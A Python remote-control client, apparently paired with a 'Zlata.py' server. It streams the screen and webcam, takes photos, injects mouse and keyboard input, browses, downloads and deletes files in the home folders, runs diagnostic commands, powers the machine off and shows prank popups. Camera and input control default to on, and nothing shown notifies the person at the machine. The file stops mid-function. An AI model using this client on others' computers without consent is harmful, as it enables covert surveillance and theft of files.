# z16.py
# -*- coding: utf-8 -*-
"""
Neon Remote Client.

This client is designed to work with Zlata.py.

Features:
- authenticated heartbeat
- screen streaming only while Zlata is viewing it
- camera streaming only while Zlata is viewing it
- camera photo capture on demand
- click / double-click / right-click / text typing
- file manager inside a configurable shared folder
- optional remote command execution
- local chat-cache capability is intentionally separate; the persistent
  controller chat is stored by Zlata.py in its local JSON file.

Install on Windows/macOS:
  pip install requests pillow opencv-python pyautogui mss pyperclip
Optional Windows volume control:
  pip install pycaw comtypes

Environment:
  SERVER_URL           e.g. https://your-server.example.com
  REMOTE_CLIENT_TOKEN  must match Zlata.py
  REMOTE_FS_ROOTS      semicolon list: name=absolute_path;name=absolute_path
  ALLOW_REMOTE_CAMERA  1/0 (default 1)
  ALLOW_REMOTE_INPUT   1/0 (default 1)
  ALLOW_REMOTE_CMD     1/0 (default 1; read-only diagnostics only)
"""
from __future__ import annotations

import base64
import io
import os
import platform
import shutil
import socket
import subprocess
import tempfile
import threading
import time
import uuid
from pathlib import Path
from typing import Any

try:
    import requests
except Exception:
    requests = None
try:
    from PIL import Image, ImageGrab
except Exception:
    Image = None
    ImageGrab = None

try:
    import mss
except Exception:
    mss = None
try:
    import websocket  # websocket-client
    WEBSOCKET_AVAILABLE = True
except Exception:
    websocket = None
    WEBSOCKET_AVAILABLE = False

SERVER_URL = os.environ.get("SERVER_URL", "https://zlata.onrender.com").rstrip("/")
CLIENT_TOKEN = os.environ.get("REMOTE_CLIENT_TOKEN", "change-me-client-token")
CLIENT_ID = os.environ.get("REMOTE_CLIENT_ID") or (str(uuid.getnode()) + "-" + socket.gethostname())
PC_NAME = os.environ.get("REMOTE_CLIENT_NAME", socket.gethostname())

ALLOW_REMOTE_CAMERA = os.environ.get("ALLOW_REMOTE_CAMERA", "1") == "1"
ALLOW_REMOTE_INPUT = os.environ.get("ALLOW_REMOTE_INPUT", "1") == "1"
ALLOW_REMOTE_CMD = os.environ.get("ALLOW_REMOTE_CMD", "1") == "1"

# Explicitly configured roots.  The client never accepts a path outside these roots.
def _default_fs_roots() -> dict[str, Path]:
    home = Path.home().resolve()
    roots = {"home": home}
    candidates = {
        "desktop": home / "Desktop",
        "documents": home / "Documents",
        "downloads": home / "Downloads",
        "shared": home / "RemoteNeonShare",
    }
    for name, path in candidates.items():
        if path.exists():
            roots[name] = path.resolve()
    return roots


def _parse_fs_roots() -> dict[str, Path]:
    raw = os.environ.get("REMOTE_FS_ROOTS", "").strip()
    if not raw:
        roots = _default_fs_roots()
    else:
        roots = {}
        for item in raw.split(";"):
            item = item.strip()
            if not item or "=" not in item:
                continue
            name, value = item.split("=", 1)
            name = name.strip().lower().replace(" ", "_")
            value = value.strip()
            if not name or not value:
                continue
            path = Path(value).expanduser().resolve()
            if path.exists() and path.is_dir():
                roots[name] = path
    if not roots:
        fallback = (home / "RemoteNeonShare").resolve() if 'home' in locals() else Path.home().resolve()
        fallback.mkdir(parents=True, exist_ok=True)
        roots = {"shared": fallback}
    for path in roots.values():
        path.mkdir(parents=True, exist_ok=True)
    return roots


REMOTE_FS_ROOTS = _parse_fs_roots()

FRAME_INTERVAL = max(0.04, float(os.environ.get("FRAME_INTERVAL", "0.06")))
HEARTBEAT_INTERVAL = max(0.5, float(os.environ.get("HEARTBEAT_INTERVAL", "1.0")))
HTTP_TIMEOUT = max(2.0, float(os.environ.get("HTTP_TIMEOUT", "8")))
OFFLINE_BACKOFF_MIN = max(2.0, float(os.environ.get("OFFLINE_BACKOFF_MIN", "2")))
OFFLINE_BACKOFF_MAX = max(10.0, float(os.environ.get("OFFLINE_BACKOFF_MAX", "60")))
SCREEN_JPEG_QUALITY = max(35, min(90, int(os.environ.get("SCREEN_JPEG_QUALITY", "65"))))
SCREEN_MAX_WIDTH = max(640, int(os.environ.get("SCREEN_MAX_WIDTH", "2560")))
SCREEN_MONITOR = max(0, int(os.environ.get("SCREEN_MONITOR", "0")))

STREAMING_SCREEN = False
STREAMING_CAMERA = False
STOP = False

SYSTEM = platform.system().lower()
IS_WINDOWS = SYSTEM == "windows"
IS_MACOS = SYSTEM == "darwin"
IS_LINUX = SYSTEM == "linux"

def _http_post(path: str, *, json=None, data=None, timeout=HTTP_TIMEOUT):
    if requests is None:
        raise RuntimeError("requests is not installed")
    last_exc = None
    for attempt in range(3):
        try:
            r = requests.post(
                SERVER_URL + path,
                json=json,
                data=data,
                headers=headers(),
                timeout=timeout,
            )
            r.raise_for_status()
            return r
        except Exception as exc:
            last_exc = exc
            if attempt < 2:
                time.sleep(0.4 * (attempt + 1))
    raise last_exc

def _screen_primary_bbox():
    if mss is not None:
        with mss.mss() as sct:
            monitors = sct.monitors
            idx = SCREEN_MONITOR if SCREEN_MONITOR < len(monitors) else 1
            mon = monitors[idx]
            return int(mon["left"]), int(mon["top"]), int(mon["width"]), int(mon["height"])
    if ImageGrab is not None:
        img = ImageGrab.grab()
        return 0, 0, int(img.width), int(img.height)
    return 0, 0, 0, 0

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
    try:
        pyautogui.FAILSAFE = True
    except Exception:
        pass
except Exception:
    PYAUTOGUI_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except Exception:
    pyperclip = None
    PYPERCLIP_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except Exception:
    CV2_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except Exception:
    psutil = None
    PSUTIL_AVAILABLE = False


def headers() -> dict[str, str]:
    return {"X-Client-Token": CLIENT_TOKEN}


def post_json(path: str, payload: dict[str, Any], timeout: float = HTTP_TIMEOUT):
    r = _http_post(path, json=payload, timeout=timeout)
    return r.json()


def _split_remote_path(rel: str) -> tuple[str, Path, str]:
    rel = (rel or "").replace("\\", "/").strip("/")
    if not rel:
        raise ValueError("root list")
    parts = [p for p in rel.split("/") if p not in ("", ".")]
    root_name = parts[0].lower()
    if root_name not in REMOTE_FS_ROOTS:
        raise ValueError("unknown filesystem root")
    root = REMOTE_FS_ROOTS[root_name].resolve()
    sub = Path(*parts[1:]) if len(parts) > 1 else Path()
    target = (root / sub).resolve()
    try:
        target.relative_to(root)
    except ValueError:
        raise ValueError("Path traversal blocked")
    return root_name, target, "/".join(parts)


def safe_rel(rel: str) -> Path:
    return _split_remote_path(rel)[1]


def rel_for(path: Path) -> str:
    resolved = path.resolve()
    for name, root in REMOTE_FS_ROOTS.items():
        try:
            return f"{name}/{resolved.relative_to(root).as_posix()}".rstrip("/")
        except ValueError:
            continue
    raise ValueError("path is outside configured roots")


def file_list(rel: str) -> dict[str, Any]:
    if not (rel or "").strip("/\\"):
        items = []
        for name, root in sorted(REMOTE_FS_ROOTS.items()):
            try:
                st = root.stat()
                items.append({"name": name, "is_dir": True, "size": None, "mtime": time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime)), "rel": name})
            except (OSError, PermissionError):
                continue
        return {"ok": True, "path": "", "items": items, "roots": {k: str(v) for k, v in REMOTE_FS_ROOTS.items()}}
    base = safe_rel(rel)
    if not base.exists():
        return {"ok": False, "error": "path not found"}
    if not base.is_dir():
        return {"ok": False, "error": "not a directory"}

    items = []
    for p in sorted(base.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
        try:
            st = p.stat()
            items.append({
                "name": p.name,
                "is_dir": p.is_dir(),
                "size": st.st_size if p.is_file() else None,
                "mtime": time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime)),
                "rel": rel_for(p),
            })
        except (OSError, PermissionError):
            continue
    return {"ok": True, "path": rel_for(base), "items": items, "roots": {k: str(v) for k, v in REMOTE_FS_ROOTS.items()}}


def file_view(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    if not path.is_file():
        return {"ok": False, "error": "not a file"}
    if path.stat().st_size > 300_000:
        return {"ok": False, "error": "text preview limited to 300 KB"}
    try:
        return {"ok": True, "content": path.read_text(encoding="utf-8", errors="replace")}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def file_download(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    if not path.is_file():
        return {"ok": False, "error": "not a file"}
    if path.stat().st_size > 8 * 1024 * 1024:
        return {"ok": False, "error": "download limited to 8 MB"}
    data = path.read_bytes()
    return {
        "ok": True,
        "data_b64": base64.b64encode(data).decode("ascii"),
        "name": path.name,
    }


def file_delete(rel: str) -> dict[str, Any]:
    path = safe_rel(rel)
    try:
        _, target, rel_path = _split_remote_path(rel)
        if rel_path.count("/") == 0:
            return {"ok": False, "error": "cannot delete filesystem root"}
    except ValueError as exc:
        return {"ok": False, "error": str(exc)}
    if not path.exists():
        return {"ok": False, "error": "not found"}
    try:
        if path.is_dir():
            shutil.rmtree(path)
        else:
            path.unlink()
        return {"ok": True}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def file_upload(rel: str, name: str, data_b64: str) -> dict[str, Any]:
    if len(data_b64) > 11 * 1024 * 1024:
        return {"ok": False, "error": "upload too large"}
    if "/" in name or "\\" in name or name in {"", ".", ".."}:
        return {"ok": False, "error": "invalid filename"}
    parent = safe_rel(rel)
    parent.mkdir(parents=True, exist_ok=True)
    dest = (parent / Path(name).name).resolve()
    try:
        root_name, _, _ = _split_remote_path(rel)
        dest.relative_to(REMOTE_FS_ROOTS[root_name])
    except ValueError:
        return {"ok": False, "error": "path traversal blocked"}
    try:
        raw = base64.b64decode(data_b64, validate=True)
        if len(raw) > 8 * 1024 * 1024:
            return {"ok": False, "error": "upload too large"}
        dest.write_bytes(raw)
        return {"ok": True, "name": dest.name}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}



def _ws_server_url(path: str) -> str:
    if SERVER_URL.startswith("https://"):
        return "wss://" + SERVER_URL[len("https://"):].rstrip("/") + path
    if SERVER_URL.startswith("http://"):
        return "ws://" + SERVER_URL[len("http://"):].rstrip("/") + path
    return SERVER_URL.rstrip("/") + path


def _open_screen_socket():
    if not WEBSOCKET_AVAILABLE:
        return None
    url = _ws_server_url(f"/ws/client/screen/{CLIENT_ID}")
    try:
        return websocket.create_connection(
            url,
            timeout=5,
            header=[f"X-Client-Token: {CLIENT_TOKEN}"],
            enable_multithread=True,
            http_proxy_host=None,
            http_proxy_port=None,
            suppress_origin=True,
        )
    except Exception:
        return None

def _server_host_port() -> tuple[str, int]:
    from urllib.parse import urlparse
    parsed = urlparse(SERVER_URL)
    host = parsed.hostname or ""
    if parsed.port:
        port = parsed.port
    else:
        port = 443 if parsed.scheme == "https" else 80
    return host, port

def _network_available() -> bool:
    """Cheap connectivity check without generating an HTTP request storm."""
    try:
        host, port = _server_host_port()
        if not host:
            return False
        with socket.create_connection((host, port), timeout=2.5):
            return True
    except Exception:
        return False

def capture_screen_jpeg(quality: int = SCREEN_JPEG_QUALITY) -> bytes:
    """Capture the selected physical display on Windows/macOS/Linux.

    mss is preferred because it is faster and behaves more consistently for
    physical monitor capture. Pillow remains a fallback for environments that
    do not have mss installed. macOS still requires Screen Recording permission.
    """
    if mss is not None and Image is not None:
        with mss.mss() as sct:
            monitors = sct.monitors
            idx = SCREEN_MONITOR if SCREEN_MONITOR < len(monitors) else 1
            shot = sct.grab(monitors[idx])
            img = Image.frombytes("RGB", shot.size, shot.rgb)
    elif ImageGrab is not None:
        try:
            img = ImageGrab.grab(all_screens=True)
        except TypeError:
            img = ImageGrab.grab()
        img = img.convert("RGB")
    else:
        raise RuntimeError("No screen capture backend installed")

    if img.width > SCREEN_MAX_WIDTH:
        new_h = max(1, int(img.height * (SCREEN_MAX_WIDTH / img.width)))
        img = img.resize((SCREEN_MAX_WIDTH, new_h), Image.Resampling.LANCZOS)

    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=quality, optimize=True)
    return buf.getvalue()


def stream_screen_loop():
    global STREAMING_SCREEN
    ws = None
    consecutive_errors = 0
    ws_retry_at = 0.0
    ws_retry_delay = 1.0
    while not STOP:
        if not STREAMING_SCREEN:
            if ws is not None:
                try:
                    ws.close()
                except Exception:
                    pass
                ws = None
            ws_retry_delay = 1.0
            time.sleep(0.20)
            continue

        try:
            now = time.time()
            if ws is None and WEBSOCKET_AVAILABLE and now >= ws_retry_at:
                ws = _open_screen_socket()
                if ws is None:
                    ws_retry_at = now + ws_retry_delay
                    ws_retry_delay = min(ws_retry_delay * 2.0, 15.0)
                else:
                    ws_retry_delay = 1.0

            frame = capture_screen_jpeg()
            if not frame:
                time.sleep(FRAME_INTERVAL)
                continue

            if ws is not None:
                try:
                    ws.send_binary(frame)
                except Exception:
                    try:
                        ws.close()
                    except Exception:
                        pass
                    ws = None
                    ws_retry_at = time.time() + ws_retry_delay
                    ws_retry_delay = min(ws_retry_delay * 2.0, 15.0)
                    # Single HTTP fallback frame; do not spam the server.
                    try:
                        _http_post(f"/api/upload_frame/{CLIENT_ID}", data=frame, timeout=3)
                    except Exception:
                        pass
            else:
                # WS temporarily unavailable; one low-rate HTTP fallback frame.
                _http_post(f"/api/upload_frame/{CLIENT_ID}", data=frame, timeout=3)
            consecutive_errors = 0
        except Exception:
            consecutive_errors += 1
            if ws is not None:
                try:
                    ws.close()
                except Exception:
                    pass
                ws = None
            if consecutive_errors >= 3:
                time.sleep(min(0.5 * consecutive_errors, 3.0))
        time.sleep(FRAME_INTERVAL)

def open_camera():
    if not CV2_AVAILABLE:
        return None
    candidates = []
    if IS_WINDOWS and hasattr(cv2, "CAP_DSHOW"):
        candidates.append((0, cv2.CAP_DSHOW))
    elif IS_MACOS and hasattr(cv2, "CAP_AVFOUNDATION"):
        candidates.append((0, cv2.CAP_AVFOUNDATION))
    candidates.append((0, None))
    for index, backend in candidates:
        try:
            cap = cv2.VideoCapture(index, backend) if backend is not None else cv2.VideoCapture(index)
            if cap.isOpened():
                return cap
            cap.release()
        except Exception:
            pass
    return None


def capture_camera_jpeg(cap, quality: int = 60) -> bytes | None:
    ok, frame = cap.read()
    if not ok:
        return None
    ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
    return enc.tobytes() if ok else None


def stream_camera_loop():
    global STREAMING_CAMERA
    cap = None
    try:
        while not STOP:
            if not STREAMING_CAMERA or not ALLOW_REMOTE_CAMERA or not CV2_AVAILABLE:
                if cap is not None:
                    cap.release()
                    cap = None
                time.sleep(0.3)
                continue
            if cap is None:
                cap = open_camera()
                if cap is None:
                    time.sleep(1)
                    continue
            try:
                frame = capture_camera_jpeg(cap, 60)
                if frame:
                    if requests is None:
                        time.sleep(1.0)
                        continue
                    _http_post(
                        f"/api/upload_camera/{CLIENT_ID}",
                        data=frame,
                        timeout=3,
                    )
            except Exception:
                pass
            time.sleep(FRAME_INTERVAL)
    finally:
        if cap is not None:
            cap.release()


def camera_photo() -> dict[str, Any]:
    if not ALLOW_REMOTE_CAMERA:
        return {"ok": False, "error": "remote camera disabled on client"}
    if not CV2_AVAILABLE:
        return {"ok": False, "error": "opencv-python not installed"}

    cap = open_camera()
    if cap is None:
        return {"ok": False, "error": "camera could not be opened"}
    try:
        ok, frame = cap.read()
        if not ok:
            return {"ok": False, "error": "camera read failed"}
        ok, enc = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
        if not ok:
            return {"ok": False, "error": "jpeg encode failed"}
        return {
            "ok": True,
            "data_b64": base64.b64encode(enc.tobytes()).decode("ascii"),
        }
    finally:
        cap.release()


def do_click(x: Any, y: Any, click_type: str) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}

    try:
        if x is not None and y is not None:
            x_i, y_i = int(x), int(y)
            pyautogui.moveTo(x_i, y_i, duration=0)
        if click_type == "click":
            pyautogui.click()
        elif click_type == "double":
            pyautogui.doubleClick()
        elif click_type == "right":
            pyautogui.rightClick()
        else:
            return {"ok": False, "error": "invalid click type"}
        return {"ok": True}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def do_type(text: str) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}
    text = str(text)
    if len(text) > 4000:
        return {"ok": False, "error": "text too long"}
    try:
        pyautogui.write(text, interval=0.01)
        return {"ok": True}
    except Exception as exc:
        if not PYPERCLIP_AVAILABLE:
            return {"ok": False, "error": str(exc) + "; install pyperclip for Unicode text"}
        try:
            previous = pyperclip.paste()
        except Exception:
            previous = None
        try:
            pyperclip.copy(text)
            if IS_MACOS:
                pyautogui.hotkey("command", "v")
            else:
                pyautogui.hotkey("ctrl", "v")
            return {"ok": True, "method": "clipboard"}
        except Exception as paste_exc:
            return {"ok": False, "error": str(paste_exc)}
        finally:
            if previous is not None:
                try:
                    pyperclip.copy(previous)
                except Exception:
                    pass


KEY_ALIASES = {
    "return": "enter", "esc": "esc", "escape": "esc", "spacebar": "space",
    "arrowleft": "left", "arrowright": "right", "arrowup": "up", "arrowdown": "down",
    "del": "delete", "pgup": "pageup", "pgdn": "pagedown",
    "left": "left", "right": "right", "up": "up", "down": "down",
    "pageup": "pageup", "pagedown": "pagedown", "home": "home", "end": "end",
    "backspace": "backspace", "delete": "delete", "tab": "tab",
    "insert": "insert", "printscreen": "printscreen",
}
KEY_MODIFIERS = {"ctrl", "alt", "shift", "win", "command", "cmd"}


def do_key(key: str, modifiers: list[str] | None = None) -> dict[str, Any]:
    if not ALLOW_REMOTE_INPUT:
        return {"ok": False, "error": "remote input disabled on client"}
    if not PYAUTOGUI_AVAILABLE:
        return {"ok": False, "error": "pyautogui not installed"}
    raw_key = str(key or "").strip().lower()
    mapped = KEY_ALIASES.get(raw_key, raw_key)
    if not mapped or len(mapped) > 32:
        return {"ok": False, "error": "invalid key"}
    mods = [str(m).strip().lower() for m in (modifiers or [])]
    mods = [KEY_ALIASES.get(m, m) for m in mods]
    if IS_MACOS:
        mods = ["command" if m in {"win", "cmd"} else m for m in mods]
    elif IS_WINDOWS:
        mods = ["win" if m == "command" else m for m in mods]
    if any(m not in KEY_MODIFIERS for m in mods):
        return {"ok": False, "error": "invalid modifier"}
    try:
        if mods:
            pyautogui.hotkey(*mods, mapped)
        else:
            pyautogui.press(mapped)
        return {"ok": True, "key": mapped, "modifiers": mods}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def _system_beep() -> None:
    if IS_WINDOWS:
        import winsound
        winsound.MessageBeep()
    elif IS_MACOS:
        subprocess.run(["osascript", "-e", "beep"], timeout=3, check=False, capture_output=True)
    else:
        subprocess.run(["sh", "-lc", "printf '\\a'"], timeout=3, check=False, capture_output=True)


def _desktop_notify(title: str, message: str) -> bool:
    try:
        if IS_MACOS:
            import json
            script = f"display notification {json.dumps(message, ensure_ascii=False)} with title {json.dumps(title, ensure_ascii=False)}"
            subprocess.run(["osascript", "-e", script], timeout=4, check=False, capture_output=True)
            return True
        if IS_WINDOWS:
            # Optional native toast backend; fall back to a harmless system beep.
            try:
                from plyer import notification
                notification.notify(title=title, message=message, timeout=3, app_name="Remote Demo")
                return True
            except Exception:
                import winsound
                winsound.MessageBeep()
                return True
        if shutil.which("notify-send"):
            subprocess.run(["notify-send", title, message], timeout=4, check=False, capture_output=True)
            return True
    except Exception:
        pass
    return False


def demo_prank(action: str, seconds: int = 3) -> dict[str, Any]:
    """Safe, reversible cross-platform prank/demo effects only."""
    action = str(action or "").lower().strip()
    try:
        seconds = max(1, min(int(seconds or 3), 15))
    except Exception:
        seconds = 3

    try:
        if action == "beep":
            _system_beep()
            return {"ok": True, "action": action, "platform": SYSTEM}

        if action == "double_beep":
            for _ in range(2):
                _system_beep()
                time.sleep(0.18)
            return {"ok": True, "action": action, "platform": SYSTEM}

        if action == "random_beeps":
            end = time.time() + seconds
            while time.time() < end and not STOP:
                _system_beep()
                time.sleep(0.25)
            return {"ok": True, "action": action, "seconds": seconds, "platform": SYSTEM}

        if action == "notify":
            ok = _desktop_notify("Remote Demo", "Тестове повідомлення — все нормально 🙂")
            return {"ok": ok, "action": action, "platform": SYSTEM, "fallback": not ok}

        if action == "combo":
            _system_beep()
            time.sleep(0.2)
            _desktop_notify("Remote Demo", "Бро, це просто пранк 😈")
            time.sleep(0.4)
            _system_beep()
            return {"ok": True, "action": action, "platform": SYSTEM}

        return {"ok": False, "error": "unsupported safe demo effect"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def run_command(command: str) -> dict[str, Any]:
    """Run a small allowlist of read-only diagnostics on the local client."""
    if not ALLOW_REMOTE_CMD:
        return {"ok": False, "error": "remote command execution disabled on client"}
    raw = str(command or "").strip()
    if not raw:
        return {"ok": False, "error": "empty command"}
    try:
        import shlex
        parts = shlex.split(raw, posix=not IS_WINDOWS)
    except Exception as exc:
        return {"ok": False, "error": f"invalid command: {exc}"}
    if not parts:
        return {"ok": False, "error": "empty command"}

    name = parts[0].lower()
    allowed = {
        "hostname", "whoami", "uname", "sw_vers", "ver", "ipconfig", "ifconfig",
        "netstat", "systeminfo", "tasklist", "df", "free", "ps", "ip", "echo"
    }
    if name not in allowed:
        return {"ok": False, "error": "command not allowed; use a read-only diagnostic command"}

    # Restrict arguments to simple flags / words for the diagnostic set.
    if any(";" in p or "&&" in p or "||" in p or "|" in p or "`" in p for p in parts):
        return {"ok": False, "error": "shell operators are not allowed"}
    if len(parts) > 8:
        return {"ok": False, "error": "too many arguments"}

    # Only read-only forms are accepted for potentially privileged diagnostic tools.
    if name == "ip" and parts[1:] and parts[1].lower() not in {"addr", "a", "link", "route"}:
        return {"ok": False, "error": "only read-only 'ip addr/link/route' diagnostics are allowed"}
    if name == "ifconfig" and len(parts) > 1:
        return {"ok": False, "error": "use ifconfig without modifying arguments"}

    if name == "echo":
        return {"ok": True, "output": " ".join(parts[1:])[:10000], "returncode": 0}

    if IS_WINDOWS:
        commands = {
            "hostname": ["hostname"],
            "whoami": ["whoami"],
            "ver": ["cmd.exe", "/c", "ver"],
            "ipconfig": ["ipconfig"],
            "systeminfo": ["systeminfo"],
            "tasklist": ["tasklist"],
            "netstat": ["netstat", *parts[1:]],
        }
    elif IS_MACOS:
        commands = {
            "hostname": ["hostname"],
            "whoami": ["whoami"],
            "uname": ["uname", *parts[1:]],
            "sw_vers": ["sw_vers"],
            "ifconfig": ["ifconfig"],
            "netstat": ["netstat", *parts[1:]],
            "df": ["df", *parts[1:]],
            "ps": ["ps", *parts[1:]],
        }
    else:
        commands = {
            "hostname": ["hostname"],
            "whoami": ["whoami"],
            "uname": ["uname", *parts[1:]],
            "ifconfig": ["ifconfig", *parts[1:]],
            "ip": ["ip", *parts[1:]],
            "netstat": ["netstat", *parts[1:]],
            "df": ["df", *parts[1:]],
            "free": ["free", *parts[1:]],
            "ps": ["ps", *parts[1:]],
        }
    argv = commands.get(name)
    if argv is None:
        return {"ok": False, "error": f"command '{name}' is not available on this OS"}

    try:
        proc = subprocess.run(argv, shell=False, capture_output=True, text=True, timeout=20)
        output = (proc.stdout or "") + (proc.stderr or "")
        if not output.strip():
            output = "[command completed]"
        return {"ok": proc.returncode == 0, "output": output[-100_000:], "returncode": proc.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"command '{name}' is not installed on this client"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "command timeout"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def system_action(action: Any) -> dict[str, Any]:
    """Perform standard local OS session/power actions when explicitly enabled."""
    action = str(action or "").lower()
    try:
        if action == "shutdown":
            if IS_WINDOWS:
                subprocess.Popen(["shutdown", "/s", "/t", "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen(["shutdown", "-h", "now"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif action == "restart":
            if IS_WINDOWS:
                subprocess.Popen(["shutdown", "/r", "/t", "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen(["shutdown", "-r", "now"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif action == "logout":
            if IS_WINDOWS:
                subprocess.Popen(["shutdown", "/l"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif IS_MACOS:
                subprocess.run(["osascript", "-e", 'tell application "System Events" to log out'], timeout=5, check=False, capture_output=True)
            else:
                subprocess.Popen(["loginctl", "terminate-user", os.environ.get("USER", "")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif action == "sleep":
            if IS_MACOS:
                subprocess.Popen(["pmset", "sleepnow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif IS_WINDOWS:
                subprocess.Popen(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen(["systemctl", "suspend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            return {"ok": False, "error": "unsupported system action"}
        return {"ok": True, "action": action, "platform": SYSTEM}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def set_volume(value: Any) -> dict[str, Any]:
    try:
        value = max(0, min(100, int(float(value))))
    except Exception:
        return {"ok": False, "error": "invalid volume"}
    try:
        if IS_MACOS:
            subprocess.run(["osascript", "-e", f"set volume output volume {value}"], timeout=4, check=True, capture_output=True)
            return {"ok": True, "value": value}
        if IS_WINDOWS:
            # Optional backend: pycaw. Keep client functional when it is absent.
            try:
                from ctypes import POINTER, cast
                from comtypes import CLSCTX_ALL
                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                endpoint = cast(interface, POINTER(IAudioEndpointVolume))
                endpoint.SetMasterVolumeLevelScalar(value / 100.0, None)
                return {"ok": True, "value": value}
            except Exception:
                return {"ok": False, "error": "Windows volume backend unavailable (install pycaw + comtypes)"}
        return {"ok": False, "error": "volume control backend unavailable on this platform"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def handle_job(job: dict[str, Any]) -> dict[str, Any]:
    action = job.get("action")
    payload = job.get("payload") or {}

    if action == "input_click":
        return do_click(payload.get("x"), payload.get("y"), payload.get("type", "click"))

    if action == "input_type":
        return do_type(payload.get("text", ""))

    if action == "input_key":
        return do_key(payload.get("key", ""), payload.get("modifiers") or [])

    if action == "demo_prank":
        return demo_prank(payload.get("effect", ""), payload.get("seconds", 3))

    if action == "camera_photo":
        return camera_photo()

    if action == "fs_list":
        return file_list(payload.get("path", ""))

    if action == "fs_view":
        return file_view(payload.get("path", ""))

    if action == "fs_download":
        return file_download(payload.get("path", ""))

    if action == "fs_delete":
        return file_delete(payload.get("path", ""))

    if action == "fs_upload":
        return file_upload(
            payload.get("path", ""),
            payload.get("name", ""),
            payload.get("data_b64", ""),
        )

    if action == "command":
        return run_command(payload.get("command", ""))

    if action == "system_action":
        return system_action(payload.get("action", ""))

    if action == "volume":
        return set_volume(payload.get("value", 50))

    return {"ok": False, "error": f"unknown action: {action}"}


def platform_info() -> dict[str, Any]:
    shell_name = "CMD" if IS_WINDOWS else ("Terminal / zsh" if IS_MACOS else "Terminal / bash")
    info: dict[str, Any] = {
        "platform": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "shell": shell_name,
    }
    try:
        x, y, w, h = _screen_primary_bbox()
        info["screen"] = {"x": x, "y": y, "width": w, "height": h}
    except Exception:
        info["screen"] = None
    return info


def telemetry() -> tuple[float | None, float | None]:
    if not PSUTIL_AVAILABLE:
        return None, None
    try:
        return float(psutil.cpu_percent(interval=None)), float(psutil.virtual_memory().percent)
    except Exception:
        return None, None


def client_loop():
    global STREAMING_SCREEN, STREAMING_CAMERA, STOP

    backoff = OFFLINE_BACKOFF_MIN
    while not STOP:
        if not _network_available():
            STREAMING_SCREEN = False
            STREAMING_CAMERA = False
            time.sleep(backoff)
            backoff = min(backoff * 2.0, OFFLINE_BACKOFF_MAX)
            continue

        try:
            caps = ["screen", "files", "platform"]
            if mss is not None or ImageGrab is not None:
                caps.append("screen_capture")
            if ALLOW_REMOTE_CAMERA and CV2_AVAILABLE:
                caps.append("camera")
            if ALLOW_REMOTE_INPUT and PYAUTOGUI_AVAILABLE:
                caps.append("input")
                caps.append("keyboard_events")
                caps.append("safe_demo_effects")
            if ALLOW_REMOTE_CMD:
                caps.append("commands")
                caps.append("diagnostics")

            cpu, ram = telemetry()
            res = post_json(
                "/api/heartbeat",
                {
                    "client_id": CLIENT_ID,
                    "name": PC_NAME,
                    "caps": caps,
                    "cpu": cpu,
                    "ram": ram,
                    "platform_info": platform_info(),
                },
                timeout=4,
            )

            backoff = OFFLINE_BACKOFF_MIN
            STREAMING_SCREEN = bool(res.get("stream_screen"))
            STREAMING_CAMERA = bool(res.get("stream_camera"))

            for job in res.get("commands", []):
                job_id = job.get("id")
                try:
                    result = handle_job(job)
                except Exception as exc:
                    result = {"ok": False, "error": str(exc)}
                try:
                    post_json(
                        f"/api/job_result/{CLIENT_ID}/{job_id}",
                        result,
                        timeout=max(5, HTTP_TIMEOUT),
                    )
                except Exception:
                    pass

        except Exception:
            STREAMING_SCREEN = False
            STREAMING_CAMERA = False
            time.sleep(backoff)
            backoff = min(backoff * 2.0, OFFLINE_BACKOFF_MAX)
            continue

        time.sleep(HEARTBEAT_INTERVAL)

def main():
    global STOP
    threading.Thread(target=stream_screen_loop, daemon=True).start()
    threading.Thread(target=stream_camera_loop, daemon=True).start()
    while not STOP:
        try:
            client_loop()
        except KeyboardInterrupt:
            STOP = True
        except Exception:
